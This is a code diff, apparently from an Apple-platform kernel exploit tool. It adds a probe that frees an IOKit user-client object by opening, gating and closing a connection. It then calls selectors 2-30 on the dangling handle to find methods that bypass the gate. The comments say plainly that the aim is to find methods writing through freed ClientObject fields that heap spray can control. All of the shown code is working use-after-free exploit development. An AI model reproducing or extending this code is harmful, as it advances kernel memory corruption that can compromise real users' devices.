@@ -3107,6 +3107,62 @@ static const char kOpenPropertiesGarbage[] =
 
         [self appendLog:[NSString stringWithFormat:@"Established %d connections to same provider (separate per-userclient gates)", connCount]];
 
+        // ---- Method Table Probe: find un-gated selectors via UAF ----
+        // Strategy: open→gate→close a probe connection (frees ClientObject),
+        // then call each selector on the DANGLING ref. Gated methods return
+        // kIOReturnNotPermitted (0xe00002c5) because the gate check sees the
+        // dead client. Un-gated methods bypass the gate and RUN with freed
+        // ClientObject — just like copyEvent (sel=2). If an un-gated method
+        // does WRITES through ClientObject fields, we can control those via spray.
+        {
+            [self appendLog:@"\n====== Method Table Probe (UAF gate bypass sweep) ======"];
+            io_connect_t probeConn = MACH_PORT_NULL;
+            kern_return_t openKr = sIOServiceOpen(providerService, mach_task_self_, 0, &probeConn);
+            if (openKr == KERN_SUCCESS && probeConn != MACH_PORT_NULL) {
+                // Gate it
+                {
+                    uint64_t openScalar = 0;
+                    sIOConnectCallMethod(probeConn, kSelectorOpen, &openScalar, 1,
+                        NULL, 0, NULL, NULL, NULL, NULL);
+                }
+                // Close → frees ClientObject, probeConn is now dangling
+                {
+                    uint64_t closeScalar = 0;
+                    sIOConnectCallMethod(probeConn, kSelectorClose, &closeScalar, 1,
+                        NULL, 0, NULL, NULL, NULL, NULL);
+                }
+
+                // Now probe selectors 2-30 on the dangling connection
+                NSMutableString *unGated = [NSMutableString string];
+                int unGatedCnt = 0;
+                for (uint32_t sel = 2; sel <= 30; sel++) {
+                    uint64_t out[4] = {0};
+                    uint32_t outCnt = 4;
+                    kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
+                        NULL, 0, NULL, 0,
+                        out, &outCnt,
+                        NULL, NULL);
+                    if (kr != (kern_return_t)0xE00002C5) {  // not kIOReturnNotPermitted
+                        [unGated appendFormat:@"\n    sel=%u kr=0x%x out=[0x%llx,0x%llx,0x%llx,0x%llx]",
+                            sel, kr, out[0], out[1], out[2], out[3]];
+                        unGatedCnt++;
+                    }
+                }
+
+                sIOServiceClose(probeConn);
+
+                if (unGatedCnt > 0) {
+                    [self appendLog:[NSString stringWithFormat:@"  UN-GATED (%d/29 bypass gate):%@",
+                        unGatedCnt, unGated]];
+                } else {
+                    [self appendLog:@"  All selectors 2-30 are GATED (only copyEvent=2 expected un-gated)"];
+                }
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  Probe conn failed: 0x%x", openKr]];
+            }
+            [self appendLog:@"====== Method Table Probe Complete ======\n"];
+        }
+
         // Map shared memory on the primary connection
         io_connect_t primaryConn = conns[0];
         mach_vm_address_t mappedAddr = 0;
